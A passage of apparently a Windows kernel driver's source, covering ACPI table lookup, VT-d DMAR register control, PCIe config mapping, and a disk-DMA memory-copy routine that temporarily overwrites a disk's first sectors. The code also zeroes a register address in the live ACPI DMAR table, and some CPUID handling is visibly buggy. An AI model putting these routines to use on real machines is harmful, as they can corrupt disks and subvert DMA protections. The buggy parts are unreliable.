    EFI_ACPI_COMMON_HEADER* Table;
    EFI_ACPI_DESCRIPTION_HEADER* Rsdt;
    EFI_ACPI_DESCRIPTION_HEADER* Xsdt;
    EFI_ACPI_2_0_FIXED_ACPI_DESCRIPTION_TABLE* Fadt;

    if (PreviousTableLocated != NULL) {
        ASSERT(PreviousTable != NULL);
        *PreviousTableLocated = FALSE;
    }
    else {
        ASSERT(PreviousTable == NULL);
    }

    Table = NULL;

    //
    // Search XSDT
    //
    Xsdt = (EFI_ACPI_DESCRIPTION_HEADER*)HalGetCachedAcpiTable('TDSX', 0, 0);
    if (Xsdt) {
        DbgMsg("[ACPI] XSDT found at: %p", Xsdt);
        if (Signature == EFI_ACPI_2_0_DIFFERENTIATED_SYSTEM_DESCRIPTION_TABLE_SIGNATURE) {
            ASSERT(PreviousTable == NULL);
            //
            // It is to locate DSDT,
            // need to locate FADT first.
            //
            Fadt = (EFI_ACPI_2_0_FIXED_ACPI_DESCRIPTION_TABLE*)ScanTableInSDT(
                Xsdt,
                sizeof(UINT64),
                EFI_ACPI_2_0_FIXED_ACPI_DESCRIPTION_TABLE_SIGNATURE,
                NULL,
                NULL
            );
            Table = LocateAcpiDsdtFromFadt(Fadt);
        }
        else if (Signature == EFI_ACPI_2_0_FIRMWARE_ACPI_CONTROL_STRUCTURE_SIGNATURE) {
            ASSERT(PreviousTable == NULL);
            //
            // It is to locate FACS,
            // need to locate FADT first.
            //
            Fadt = (EFI_ACPI_2_0_FIXED_ACPI_DESCRIPTION_TABLE*)ScanTableInSDT(
                Xsdt,
                sizeof(UINT64),
                EFI_ACPI_2_0_FIXED_ACPI_DESCRIPTION_TABLE_SIGNATURE,
                NULL,
                NULL
            );
            Table = LocateAcpiFacsFromFadt(Fadt);
        }
        else {
            Table = ScanTableInSDT(
                Xsdt,
                sizeof(UINT64),
                Signature,
                PreviousTable,
                PreviousTableLocated
            );
        }
    }
    else {
        DbgMsg("[ACPI] XSDT could not be found");
    }

    if (Table != NULL) {
        return Table;
    }
    else if ((PreviousTableLocated != NULL) &&
        *PreviousTableLocated)
    {
        //
        // PreviousTable could be located in XSDT,
        // but next table could not be located in XSDT.
        //
        return NULL;
    }

    //
    // Search RSDT
    //
    Rsdt = (EFI_ACPI_DESCRIPTION_HEADER*)HalGetCachedAcpiTable('TDSR', 0, 0);
    if (!Rsdt) {
        DbgMsg("[ACPI] Rsdt could not be found too, aborting...");
    }
    else if (Signature == EFI_ACPI_2_0_DIFFERENTIATED_SYSTEM_DESCRIPTION_TABLE_SIGNATURE) {
        ASSERT(PreviousTable == NULL);
        //
        // It is to locate DSDT,
        // need to locate FADT first.
        //
        Fadt = (EFI_ACPI_2_0_FIXED_ACPI_DESCRIPTION_TABLE*)ScanTableInSDT(
            Rsdt,
            sizeof(UINT32),
            EFI_ACPI_2_0_FIXED_ACPI_DESCRIPTION_TABLE_SIGNATURE,
            NULL,
            NULL
        );
        Table = LocateAcpiDsdtFromFadt(Fadt);
    }
    else if (Signature == EFI_ACPI_2_0_FIRMWARE_ACPI_CONTROL_STRUCTURE_SIGNATURE) {
        ASSERT(PreviousTable == NULL);
        //
        // It is to locate FACS,
        // need to locate FADT first.
        //
        Fadt = (EFI_ACPI_2_0_FIXED_ACPI_DESCRIPTION_TABLE*)ScanTableInSDT(
            Rsdt,
            sizeof(UINT32),
            EFI_ACPI_2_0_FIXED_ACPI_DESCRIPTION_TABLE_SIGNATURE,
            NULL,
            NULL
        );
        Table = LocateAcpiFacsFromFadt(Fadt);
    }
    else {
        Table = ScanTableInSDT(
            Rsdt,
            sizeof(UINT32),
            Signature,
            PreviousTable,
            PreviousTableLocated
        );
    }

    return Table;
}

/**
  This function locates next ACPI table in XSDT/RSDT based on Signature and
  previous returned Table.

  If PreviousTable is NULL:
  This function will locate the first ACPI table in XSDT/RSDT based on
  Signature in gEfiAcpi20TableGuid system configuration table first, and then
  gEfiAcpi10TableGuid system configuration table.
  This function will locate in XSDT first, and then RSDT.
  For DSDT, this function will locate XDsdt in FADT first, and then Dsdt in
  FADT.
  For FACS, this function will locate XFirmwareCtrl in FADT first, and then
  FirmwareCtrl in FADT.

  If PreviousTable is not NULL:
  1. If it could be located in XSDT in gEfiAcpi20TableGuid system configuration
     table, then this function will just locate next table in XSDT in
     gEfiAcpi20TableGuid system configuration table.
  2. If it could be located in RSDT in gEfiAcpi20TableGuid system configuration
     table, then this function will just locate next table in RSDT in
     gEfiAcpi20TableGuid system configuration table.
  3. If it could be located in RSDT in gEfiAcpi10TableGuid system configuration
     table, then this function will just locate next table in RSDT in
     gEfiAcpi10TableGuid system configuration table.

  It's not supported that PreviousTable is not NULL but PreviousTable->Signature
  is not same with Signature, NULL will be returned.

  @param Signature          ACPI table signature.
  @param PreviousTable      Pointer to previous returned table to locate next
                            table, or NULL to locate first table.

  @return Next ACPI table or NULL if not found.

**/
EFI_ACPI_COMMON_HEADER*
EfiLocateNextAcpiTable(
    IN UINT32                  Signature,
    IN EFI_ACPI_COMMON_HEADER* PreviousTable OPTIONAL
)
{
    EFI_ACPI_COMMON_HEADER* Table;
    BOOLEAN                 TempPreviousTableLocated;
    BOOLEAN* PreviousTableLocated;

    if (PreviousTable != NULL) {
        if (PreviousTable->Signature != Signature) {
            //
            // PreviousTable->Signature is not same with Signature.
            //
            DbgMsg("[ACPI] Signature does not match, aborting...");
            return NULL;
        }
        else if ((Signature == EFI_ACPI_2_0_FIXED_ACPI_DESCRIPTION_TABLE_SIGNATURE) ||
            (Signature == EFI_ACPI_2_0_DIFFERENTIATED_SYSTEM_DESCRIPTION_TABLE_SIGNATURE) ||
            (Signature == EFI_ACPI_2_0_FIRMWARE_ACPI_CONTROL_STRUCTURE_SIGNATURE))
        {
            //
            // There is only one FADT/DSDT/FACS table,
            // so don't try to locate next one.
            //
            DbgMsg("[ACPI] Only one table available, aborting...");
            return NULL;
        }

        PreviousTableLocated = &TempPreviousTableLocated;
        *PreviousTableLocated = FALSE;
    }
    else {
        PreviousTableLocated = NULL;
    }

    Table = LocateAcpiTableInAcpiConfigurationTable(
        &gEfiAcpi20TableGuid,
        Signature,
        PreviousTable,
        PreviousTableLocated
    );
    if (Table != NULL) {
        return Table;
    }
    else if ((PreviousTableLocated != NULL) &&
        *PreviousTableLocated)
    {
        //
        // PreviousTable could be located in gEfiAcpi20TableGuid system
        // configuration table, but next table could not be located in
        // gEfiAcpi20TableGuid system configuration table.
        //
        DbgMsg("[ACPI] Table could not be located in gEfiAcpi20TableGuid, aborting...");
        return NULL;
    }

    return LocateAcpiTableInAcpiConfigurationTable(
        &gEfiAcpi10TableGuid,
        Signature,
        PreviousTable,
        PreviousTableLocated
    );
}

/**
  This function locates first ACPI table in XSDT/RSDT based on Signature.

  This function will locate the first ACPI table in XSDT/RSDT based on
  Signature in gEfiAcpi20TableGuid system configuration table first, and then
  gEfiAcpi10TableGuid system configuration table.
  This function will locate in XSDT first, and then RSDT.
  For DSDT, this function will locate XDsdt in FADT first, and then Dsdt in
  FADT.
  For FACS, this function will locate XFirmwareCtrl in FADT first, and then
  FirmwareCtrl in FADT.

  @param Signature          ACPI table signature.

  @return First ACPI table or NULL if not found.

**/
EFI_ACPI_COMMON_HEADER*
EfiLocateFirstAcpiTable(
    IN UINT32  Signature
)
{
    return EfiLocateNextAcpiTable(Signature, NULL);
}

EFI_ACPI_DMAR_HEADER* acpi::dmarTable = nullptr;
MCFG_TABLE* acpi::mcfgTable = nullptr;
bool bAcpiInit = false;

bool acpi::Init()
{
    if (bAcpiInit)
        return true;

    dmarTable = (EFI_ACPI_DMAR_HEADER*)EfiLocateFirstAcpiTable(EFI_ACPI_4_0_DMA_REMAPPING_TABLE_SIGNATURE);
    if (!dmarTable) {
        DbgMsg("[ACPI] Failed locating ACPI DMAR table!");
        if (CPU::bIntelCPU)
            return false;
    }
    else {
        DbgMsg("[ACPI] DMAR table at: %p", dmarTable);
    }

    mcfgTable = (MCFG_TABLE*)EfiLocateFirstAcpiTable(EFI_ACPI_4_0_MEMORY_MAPPED_ENHANCED_CONFIGURATION_SPACE_BASE_ADDRESS_ALLOCATION_SIGNATURE);
    if (!mcfgTable) {
        DbgMsg("[ACPI] Failed locating ACPI MCFG table!");
        if (!CPU::bIntelCPU)
            return false;
    }
    else {
        DbgMsg("[ACPI] MCFG table with 0x%llx entries at: %p", (mcfgTable->headers.Header.Length - sizeof(mcfgTable->headers)) / sizeof(*mcfgTable->entry), mcfgTable);
    }

    DbgMsg("[ACPI] Succesfully setup!");
    bAcpiInit = true;
    return true;
}

acpi::DmarRegister::DmarRegister(DWORD64 registerPa)
{
    _registerPa = registerPa;
    PHYSICAL_ADDRESS pa = { 0 };
    pa.QuadPart = _registerPa;
    _mappedRegister = MmMapIoSpaceEx(pa, PAGE_SIZE, PAGE_READWRITE | PAGE_NOCACHE);
}

acpi::DmarRegister::~DmarRegister()
{
    MmUnmapIoSpace(_mappedRegister, PAGE_SIZE);
}

void acpi::DmarRegister::SendGlobalCmdSerialized(DWORD64 mask, BOOLEAN bSet)
{
    if (!mask)
        return;

    DWORD32 flags = *(DWORD32*)((DWORD64)_mappedRegister + R_GSTS_REG);
    if (bSet) {
        flags |= mask;
    }
    else {
        flags &= ~mask;
    }
    *(DWORD32*)((DWORD64)_mappedRegister + R_GCMD_REG) = flags;

    threading::Sleep(100);
}

void acpi::DmarRegister::SendContextCmdSerialized(DWORD64 mask)
{
    *(DWORD64*)((DWORD64)_mappedRegister + R_CCMD_REG) = (mask | B_CCMD_REG_ICC);
    //for (; (*(DWORD64*)((DWORD64)_mappedRegister + R_CCMD_REG) & B_CCMD_REG_ICC) != 0;)
    //{
    //    __noop();
    //}
}

void acpi::DmarRegister::SetRootTable(PVOID pTable)
{
    VTD_ROOT_TABLE_ADDRESS_REGISTER rootTableAddressReg = { 0 };
    rootTableAddressReg.AsUInt64 = 0;

    rootTableAddressReg.Bits.RootTable = (UINT64)Memory::VirtToPhy(pTable) >> 12;
    *(DWORD64*)((DWORD64)_mappedRegister + R_RTADDR_REG) = rootTableAddressReg.AsUInt64;

    SendGlobalCmdSerialized(B_GMCD_REG_SRTP, true);
}

PVOID acpi::DmarRegister::GetRootTable()
{
    return *(PVOID*)((DWORD64)_mappedRegister + R_RTADDR_REG);
}

PVOID acpi::DmarRegister::GetMappedRegister()
{
    return _mappedRegister;
}

void acpi::DmarRegister::InvalidateIoTlb(DWORD64 mask)
{
    if (!mask)
        return;

    VTD_ECAP_REG ExtendedCapability = { 0 };
    ExtendedCapability.Uint64 = *(DWORD64*)((DWORD64)_mappedRegister + R_ECAP_REG);
    DWORD64 iotlbRegOffset = (UINT64)ExtendedCapability.Bits.IRO * 16;

    *(DWORD64*)((DWORD64)_mappedRegister + iotlbRegOffset + R_IOTLB_REG) = (mask | B_IOTLB_REG_IVT);

    threading::Sleep(1);
}

acpi::McfgRegister::McfgRegister(MCFG_TABLE* table)
{
    _mcfgTable = table;
    _entries = (table->headers.Header.Length - sizeof(table->headers)) / sizeof(*table->entry);
}

int acpi::McfgRegister::size()
{
    return (int)_entries;
}

PPCI_CONFIG_SPACE acpi::McfgRegister::GetPCIeConfigSpace(ACPI_BDF bdf)
{
    PVOID pConfigSpace = nullptr;
    for (int i = 0; i < _entries; i++) {
        if ((*this)[i].StartBusNumber <= bdf.bits.bus
            && (*this)[i].EndBusNumber >= bdf.bits.bus) {
            PHYSICAL_ADDRESS pa = { 0 };
            pa.QuadPart = (*this)[i].BaseAddress + ((bdf.bits.bus - (*this)[i].StartBusNumber) << 20 | bdf.bits.device << 15 | bdf.bits.function << 12);
            pConfigSpace = MmMapIoSpace(pa, PAGE_SIZE, MEMORY_CACHING_TYPE::MmNonCached);
            break;
        }
    }
    return (PPCI_CONFIG_SPACE)pConfigSpace;
}

PPCI_CONFIG_SPACE acpi::McfgRegister::AllPCIeConfigSpace(int index)
{
    PHYSICAL_ADDRESS pa = { 0 };
    pa.QuadPart = (*this)[index].BaseAddress;
    return (PPCI_CONFIG_SPACE)MmMapIoSpace(pa, SIZE_2MB, MEMORY_CACHING_TYPE::MmNonCached);
}

MCFG_CFG_SPACE_ADDR& acpi::McfgRegister::operator[](int index)
{
    if (index >= _entries) {
        return _mcfgTable->entry[_entries - 1];
    }
    else if (index <= 0) {
        return _mcfgTable->entry[0];
    }
    return _mcfgTable->entry[index];
}

```

`DmaProtect/src/cpp.cpp`:

```cpp
#include "cpp.h"

void* cpp::kMalloc(size_t sz)
{
	return ExAllocatePool(POOL_TYPE::NonPagedPool, sz);
}

void cpp::kFree(void* pBuffer)
{
	ExFreePool(pBuffer);
}

```

`DmaProtect/src/cpu.cpp`:

```cpp
#include "cpu.h"

bool CPU::bIntelCPU = false;

bool CPU::IsIntelCPU()
{
    bool isIntel = Cpuid::Cpuid::query<Cpuid::Generic::MaximumFunctionNumberAndVendorId>()->isIntel();
    if (isIntel)
        DbgMsg("[CPU] Is Intel");
    else
        DbgMsg("[CPU] Is not Intel");
    return isIntel;
}

void CPU::Init()
{
    bIntelCPU = IsIntelCPU();
}

VOID* CPU::WriteBackDataCacheRange(VOID* Address, SIZE_T Length)
{
    int  CpuIdData[4];
    SIZE_T   CacheLineSize;
    SIZE_T   Start;
    SIZE_T   End;

    if (Length == 0) {
        return Address;
    }

    //
    // If the CPU does not support CLFLUSH instruction,
    // then promote flush range to flush entire cache.
    //
    __cpuid(CpuIdData, 0x1);
    if ((CpuIdData[4] & (1ull << 19)) == 0) {
        __wbinvd();
        return Address;
    }

    //
    // Cache line size is 8 * Bits 15-08 of EBX returned from CPUID 01H
    //
    CacheLineSize = (CpuIdData[2] & 0xff00) >> 5;

    Start = (SIZE_T)Address;
    //
    // Calculate the cache line alignment
    //
    End = (Start + Length + (CacheLineSize - 1)) & ~(CacheLineSize - 1);
    Start &= ~((SIZE_T)CacheLineSize - 1);

    while (Start < End) {
        _mm_clflush((VOID*)Start);
        Start = Start + CacheLineSize;
    }

    return Address;
}

```

`DmaProtect/src/ddma.cpp`:

```cpp
#include "ddma.h"

#include <ntddscsi.h>
#include <scsi.h>

#define ATA_IO_TIMEOUT (2)
#define ATA_CMD_READ_SECTORS (0x20)
#define ATA_CMD_WRITE_SECTORS (0x30)
#define ATA_DEVICE_TRANSPORT_LBA (0x40)
#define ATA_SECTOR_SIZE (0x200)
#define SCSI_SECTOR_SIZE ATA_SECTOR_SIZE

NTSTATUS AtaIssueCommand(IN PDEVICE_OBJECT device, IN USHORT flag, IN UCHAR command, IN PVOID buffer) {
    KEVENT event;
    KeInitializeEvent(&event, SynchronizationEvent, FALSE);

    ATA_PASS_THROUGH_DIRECT request = { 0 };
    request.Length = sizeof(request);
    request.AtaFlags = flag | ATA_FLAGS_USE_DMA;
    request.DataTransferLength = PAGE_SIZE;
    request.TimeOutValue = ATA_IO_TIMEOUT;
    request.DataBuffer = buffer;

    // For the sake of brevity this uses the first sectors (unsafe!)
    request.CurrentTaskFile[1] = PAGE_SIZE / ATA_SECTOR_SIZE;
    request.CurrentTaskFile[5] = ATA_DEVICE_TRANSPORT_LBA;
    request.CurrentTaskFile[6] = command;

    IO_STATUS_BLOCK ioStatusBlock;
    PIRP irp = IoBuildDeviceIoControlRequest(IOCTL_ATA_PASS_THROUGH_DIRECT, device, &request,
        sizeof(request), &request, sizeof(request), FALSE,
        &event, &ioStatusBlock);

    if (!irp) {
        return STATUS_INSUFFICIENT_RESOURCES;
    }

    NTSTATUS status = IoCallDriver(device, irp);

    if (status == STATUS_PENDING) {
        KeWaitForSingleObject(&event, Executive, KernelMode, FALSE, NULL);
        status = ioStatusBlock.Status;
    }

    return status;
}

// Build the 10-bytes SCSI command descriptor block

BOOLEAN SCSIBuild10CDB(PSCSI_PASS_THROUGH_DIRECT srb, ULONGLONG offset, ULONG length, BOOLEAN Write) {
    if (!srb || offset >= 0x20000000000 || length < 1)
        return FALSE;

    LPCH cdb = (LPCH)srb->Cdb;

    if (Write == FALSE) {
        cdb[0] = SCSIOP_READ;
        cdb[1] = 0;
    }
    else {
        cdb[0] = SCSIOP_WRITE;
        cdb[1] = 0;
    }
    DWORD32 LBA = (DWORD32)(offset / SCSI_SECTOR_SIZE);

    cdb[2] = ((LPCH)&LBA)[3];
    cdb[3] = ((LPCH)&LBA)[2];
    cdb[4] = ((LPCH)&LBA)[1];
    cdb[5] = ((LPCH)&LBA)[0];
    cdb[6] = 0x00;

    SHORT CDBTLen = (SHORT)(length / SCSI_SECTOR_SIZE);
    cdb[7] = ((LPCH)&CDBTLen)[1];
    cdb[8] = ((LPCH)&CDBTLen)[0];
    cdb[9] = 0x00;
    return TRUE;
}

NTSTATUS ScsiIssueCommand(IN PDEVICE_OBJECT device, IN UCHAR operationCode, IN PVOID buffer) {
    KEVENT event;
    KeInitializeEvent(&event, SynchronizationEvent, FALSE);

    SCSI_PASS_THROUGH_DIRECT Srb = { 0 };
    CDB Cdb = { 0 };

    Srb.Length = sizeof(Srb);
    Srb.CdbLength = 10;
    Srb.SenseInfoLength = 0;
    Srb.SenseInfoOffset = sizeof(Srb);
    Srb.DataTransferLength = PAGE_SIZE;
    Srb.TimeOutValue = 5;
    Srb.DataBuffer = buffer;

    SCSIBuild10CDB(&Srb, 0, Srb.DataTransferLength, operationCode == SCSIOP_WRITE);

    IO_STATUS_BLOCK ioStatusBlock;
    PIRP irp = IoBuildDeviceIoControlRequest(IOCTL_SCSI_PASS_THROUGH_DIRECT, device, &Srb,
        sizeof(Srb), 0, 0, FALSE,
        &event, &ioStatusBlock);

    if (!irp) {
        return STATUS_INSUFFICIENT_RESOURCES;
    }

    NTSTATUS status = IoCallDriver(device, irp);

    if (status == STATUS_PENDING) {
        KeWaitForSingleObject(&event, Executive, KernelMode, FALSE, NULL);
        status = ioStatusBlock.Status;
    }

    return status;
}

NTSTATUS AtaReadPage(IN PDEVICE_OBJECT device, OUT PVOID dest) {
    NTSTATUS ntStatus = AtaIssueCommand(device, ATA_FLAGS_DATA_IN, ATA_CMD_READ_SECTORS, dest);
    if (!NT_SUCCESS(ntStatus)) {
        DbgPrintEx(0, 0, "Failed ATA read: 0x%x", ntStatus);
    }
    return ntStatus;
}

NTSTATUS AtaWritePage(IN PDEVICE_OBJECT device, IN PVOID src) {
    NTSTATUS ntStatus = AtaIssueCommand(device, ATA_FLAGS_DATA_OUT, ATA_CMD_WRITE_SECTORS, src);
    if (!NT_SUCCESS(ntStatus)) {
        DbgPrintEx(0, 0, "Failed ATA write: 0x%x", ntStatus);
    }
    return ntStatus;
}

NTSTATUS ScsiReadPage(IN PDEVICE_OBJECT device, OUT PVOID dest) {
    NTSTATUS ntStatus = ScsiIssueCommand(device, SCSIOP_READ, dest);
    if (!NT_SUCCESS(ntStatus)) {
        DbgPrintEx(0, 0, "Failed SCSI read: 0x%x", ntStatus);
    }
    return ntStatus;
}

NTSTATUS ScsiWritePage(IN PDEVICE_OBJECT device, IN PVOID src) {
    NTSTATUS ntStatus = ScsiIssueCommand(device, SCSIOP_WRITE, src);
    if (!NT_SUCCESS(ntStatus)) {
        DbgPrintEx(0, 0, "Failed SCSI write: 0x%x", ntStatus);
    }
    return ntStatus;
}

NTSTATUS DdmaProvider::ReadPage(OUT PVOID dest) {
    if (!pDisk) {
        DbgPrintEx(0, 0, "No disk registered!\n");
        return STATUS_NOT_FOUND;
    }
    if (bScsi)
        return ScsiReadPage(pDisk->Device, dest);
    return AtaReadPage(pDisk->Device, dest);
}

NTSTATUS DdmaProvider::WritePage(IN PVOID src) {
    if (!pDisk) {
        DbgPrintEx(0, 0, "No disk registered!\n");
        return STATUS_NOT_FOUND;
    }
    if (bScsi)
        return ScsiWritePage(pDisk->Device, src);
    return AtaWritePage(pDisk->Device, src);
}

extern "C" POBJECT_TYPE * IoDriverObjectType;
extern "C" NTSTATUS ObReferenceObjectByName(IN PUNICODE_STRING objectName, IN ULONG attributes,
    IN PACCESS_STATE passedAccessState,
    IN ACCESS_MASK desiredAccess,
    IN POBJECT_TYPE objectType,
    IN KPROCESSOR_MODE accessMode,
    IN OUT PVOID parseContext, OUT PVOID * object);

extern "C" NTSTATUS IoEnumerateDeviceObjectList(
    _In_  PDRIVER_OBJECT DriverObject,
    _Out_writes_bytes_to_opt_(DeviceObjectListSize, (*ActualNumberDeviceObjects) * sizeof(PDEVICE_OBJECT)) PDEVICE_OBJECT* DeviceObjectList,
    _In_  ULONG          DeviceObjectListSize,
    _Out_ PULONG         ActualNumberDeviceObjects
);

NTSTATUS GetDeviceObjectList(IN PDRIVER_OBJECT driverObject, OUT PDEVICE_OBJECT** outDevices,
    OUT PULONG outDeviceCount) {

    ULONG count = 0;
    NTSTATUS status = IoEnumerateDeviceObjectList(driverObject, NULL, 0, &count);

    if (status != STATUS_BUFFER_TOO_SMALL) {
        return status;
    }

    ULONG size = count * sizeof(PDEVICE_OBJECT);
    PDEVICE_OBJECT* devices = (PDEVICE_OBJECT*)ExAllocatePool(NonPagedPoolNx, size);
    if (devices) {
        *outDeviceCount = count;

        status = IoEnumerateDeviceObjectList(driverObject, devices, size, &count);
        if (NT_SUCCESS(status)) {
            *outDevices = devices;
        }
        else {
            ExFreePool(devices);
        }
    }
    else {
        status = STATUS_INSUFFICIENT_RESOURCES;
    }

    return status;
}

NTSTATUS DiskFind(OUT PDISK* outDisk, OUT PBOOLEAN bScsi) {
    PDISK disk = (PDISK)ExAllocatePool(NonPagedPoolNx, sizeof(DISK));
    if (!disk) {
        return STATUS_INSUFFICIENT_RESOURCES;
    }
    RtlZeroMemory(disk, sizeof(*disk));

    UNICODE_STRING diskStr = RTL_CONSTANT_STRING(L"\\Driver\\Disk");
    PDRIVER_OBJECT diskObject;

    NTSTATUS status = ObReferenceObjectByName(&diskStr, OBJ_CASE_INSENSITIVE, NULL, 0,
        *IoDriverObjectType, KernelMode, NULL, (PVOID*)&diskObject);

    if (NT_SUCCESS(status)) {
        PDEVICE_OBJECT* devices;
        ULONG deviceCount;

        status = GetDeviceObjectList(diskObject, &devices, &deviceCount);

        if (NT_SUCCESS(status)) {
            status = STATUS_NOT_FOUND;

            for (ULONG i = 0; i < deviceCount; ++i) {
                PDEVICE_OBJECT device = devices[i];

                if (status == STATUS_NOT_FOUND && NT_SUCCESS(ScsiReadPage(device, disk->Buffer))) {
                    disk->Device = device;
                    if (bScsi)
                        *bScsi = true;
                    status = STATUS_SUCCESS;
                    DbgPrintEx(0, 0, "Found SCSI device!\n");
                    continue;
                }
                else if (status == STATUS_NOT_FOUND && NT_SUCCESS(AtaReadPage(device, disk->Buffer))) {
                    disk->Device = device;
                    if(bScsi)
                        *bScsi = false;
                    status = STATUS_SUCCESS;
                    continue;
                }

                ObDereferenceObject(device);
            }

            ExFreePool(devices);
        }

        ObDereferenceObject(diskObject);
    }

    if (NT_SUCCESS(status)) {
        *outDisk = disk;
    }
    else {
        ExFreePool(disk);
    }

    return status;
}

NTSTATUS DdmaProvider::DiskCopyPage(PVOID dest, PVOID src) {
    if (!MmIsAddressValid(pDisk)
        || !pDisk->Device)
        return STATUS_NOT_IMPLEMENTED;

    // Read from src by writing to disk
    NTSTATUS status = WritePage(src);
    if (NT_SUCCESS(status)) {
        // Write to dest by reading from disk
        status = ReadPage(dest);

        // Restore original sectors
        WritePage(pDisk->Buffer);
    }

    return status;
}

DdmaProvider::DdmaProvider()
{
    pDisk = 0;
    DiskFind(&pDisk, &bScsi);
}

DdmaProvider::~DdmaProvider()
{
    if (MmIsAddressValid(pDisk)
        && pDisk->Device) {
        ObDereferenceObject(pDisk->Device);
        ExFreePool(pDisk);
    }
}

```

`DmaProtect/src/iommu.cpp`:

```cpp
#include "iommu.h"

/**
 * @brief Collects relevant information of each DMA-remapping hardware units.
 */
EFI_STATUS
ProcessDmarTable(
    IN EFI_ACPI_DMAR_HEADER* DmarTable,
    IN OUT DMAR_UNIT_INFORMATION* DmarUnits,
    IN UINT64 MaxDmarUnitCount,
    OUT UINT64* DetectedUnitCount
)
{
    if (!MmIsAddressValid(DmarTable)) {
        DbgMsg("[VT-d] DMAR table ptr is invalid: %p", DmarTable);
        return STATUS_NOT_MAPPED_DATA;
    }
    UINT64 endOfDmar;
    EFI_ACPI_DMAR_STRUCTURE_HEADER* dmarHeader;
    UINT64 discoveredUnitCount;

    RtlZeroMemory(DmarUnits, sizeof(*DmarUnits) * MaxDmarUnitCount);

    //
    // Walk through the DMAR table, find all DMA-remapping hardware unit
    // definition structures in it, and gather relevant information into DmarUnits.
    //
    discoveredUnitCount = 0;
    endOfDmar = (UINT64)Add2Ptr(DmarTable, DmarTable->Header.Length);
    dmarHeader = (EFI_ACPI_DMAR_STRUCTURE_HEADER*)(DmarTable + 1);
    while (dmarHeader && (UINT64)dmarHeader < endOfDmar)
    {
        if (dmarHeader->Type == EFI_ACPI_DMAR_TYPE_DRHD)
        {
            if (discoveredUnitCount < MaxDmarUnitCount)
            {
                EFI_ACPI_DMAR_DRHD_HEADER* dmarUnit;

                dmarUnit = (EFI_ACPI_DMAR_DRHD_HEADER*)dmarHeader;
                DmarUnits[discoveredUnitCount].RegisterBasePa = dmarUnit->RegisterBaseAddress;

                DmarUnits[discoveredUnitCount].Capability.Uint64 =
                    CPU::MmIoRead<DWORD64>(DmarUnits[discoveredUnitCount].RegisterBasePa + R_CAP_REG);
                DmarUnits[discoveredUnitCount].ExtendedCapability.Uint64 =
                    CPU::MmIoRead<DWORD64>(DmarUnits[discoveredUnitCount].RegisterBasePa + R_ECAP_REG);

                dmarUnit->RegisterBaseAddress = 0;
            }
            else {
                DbgMsg("[VT-d] Already found max amount of ACPI tables: 0x%x", MaxDmarUnitCount);
                break;
            }
            discoveredUnitCount++;
        }
        dmarHeader = (EFI_ACPI_DMAR_STRUCTURE_HEADER*)Add2Ptr(dmarHeader, dmarHeader->Length);
    }

    //
    // Processed all structures. It is an error if nothing found, or found too many.
    //
    *DetectedUnitCount = discoveredUnitCount;

    for (UINT64 i = 0; i < discoveredUnitCount; ++i)
    {
        DbgMsg("[VT-d] Unit %d at %p - Cap: %llx, ExCap: %llx",
            i,
            DmarUnits[i].RegisterBasePa,
            DmarUnits[i].Capability.Uint64,
            DmarUnits[i].ExtendedCapability.Uint64);
    }
    if (discoveredUnitCount == 0)
    {
        DbgMsg("[VT-d] No DMA remapping hardware unit found");
        return STATUS_UNSUCCESSFUL;
    }
    if (discoveredUnitCount > MaxDmarUnitCount)
    {
        DbgMsg("[VT-d] Too many DMA remapping hardware units found (%llu)",
            discoveredUnitCount);
        return STATUS_RESOURCE_NOT_OWNED;
    }
    return STATUS_SUCCESS;
}

/**
 * @brief Tests whether all hardware units are compatible with this project.
 */
BOOLEAN
bAllDmaRemappingUnitsCompatible(
    IN DMAR_UNIT_INFORMATION* DmarUnits,
    IN UINT64 DmarUnitsCount
)
{
    for (UINT64 i = 0; i < DmarUnitsCount; ++i)
    {
        //
        // This project does not handle 3-level page-table for simplicity.
        //
        if ((DmarUnits[i].Capability.Bits.SAGAW & BIT2) == 0)
        {
            DbgMsg(
                "[VT-d] Unit %lld does not support 48-bit AGAW (4-level page-table) : %016llx",
                i,
                DmarUnits[i].Capability.Uint64);
            return FALSE;
        }

        //
        // This project requires 2MB large pages for simple second-level table
        // implementation.
        //
        if ((DmarUnits[i].Capability.Bits.SLLPS & BIT0) == 0)
        {
            DbgMsg(
                "[VT-d] Unit %lld does not support 2MB second level large pages : %016llx",
                i,
                DmarUnits[i].Capability.Uint64);
            return FALSE;
        }

        //
        // Earlier implementation of DMA-remapping required explicit write buffer
        // flushing. The author have not encounter with such implementation. As
        // such, this project does not support it. See 6.8 Write Buffer Flushing.
        //
        if (DmarUnits[i].Capability.Bits.RWBF != FALSE)
        {
            DbgMsg(
                "[VT-d] Unit %lld requires explicit write buffer flushing : %016llx",
                i,
                DmarUnits[i].Capability.Uint64);
            return FALSE;
        }

        if ((CPU::MmIoRead<DWORD64>(DmarUnits[i].RegisterBasePa + R_GSTS_REG) & B_GSTS_REG_TE) != 0)
        {
            DbgMsg(
                "[VT-d] Unit %lld already enabled DMA remapping : %016llx",
                i,
                CPU::MmIoRead<DWORD64>(DmarUnits[i].RegisterBasePa + R_GSTS_REG));
            DmarUnits[i].bEnabled = true;
        }

        //
        // Looks good. Dump physical address of where translation fault logs are saved.
        //
        DbgMsg("[VT-d] Fault-recording register at %p",
            DmarUnits[i].RegisterBasePa + (UINT64)DmarUnits[i].Capability.Bits.FRO * 16);
    }
    return TRUE;
}

/**
 * @brief Builds identity mapping for all PCI devices, up to 512GB.
 */
VOID
BuildPassthroughTranslations(
    OUT DMAR_TRANSLATIONS* Translations
)
{
    VTD_ROOT_ENTRY defaultRootValue;
    VTD_CONTEXT_ENTRY defaultContextValue;
    VTD_SECOND_LEVEL_PAGING_ENTRY* pdpt;
    VTD_SECOND_LEVEL_PAGING_ENTRY* pd;
    VTD_SECOND_LEVEL_PAGING_ENTRY* pml4e;
    VTD_SECOND_LEVEL_PAGING_ENTRY* pdpte;
    VTD_SECOND_LEVEL_PAGING_ENTRY* pde;
    UINT64 pml4Index;
    UINT64 destinationPa;

    ASSERT(((UINT64)Translations % PAGE_SIZE) == 0);

    RtlZeroMemory(Translations, sizeof(*Translations));

    void* pSubstitutePage = cpp::kMalloc(PAGE_SIZE);
    RtlCopyMemory(pSubstitutePage, Translations->RootTable, PAGE_SIZE);

    //
    // Fill out the root table. All root entries point to the same context table.
    //
    defaultRootValue.Uint128.Uint64Hi = defaultRootValue.Uint128.Uint64Lo = 0;
    UINT64 contextTable = (UINT64)Memory::VirtToPhy(Translations->ContextTable);
    defaultRootValue.Bits.ContextTablePointerLo = (UINT32)(contextTable >> 12);
    defaultRootValue.Bits.ContextTablePointerHi = (UINT32)(contextTable >> 32);
    defaultRootValue.Bits.Present = TRUE;
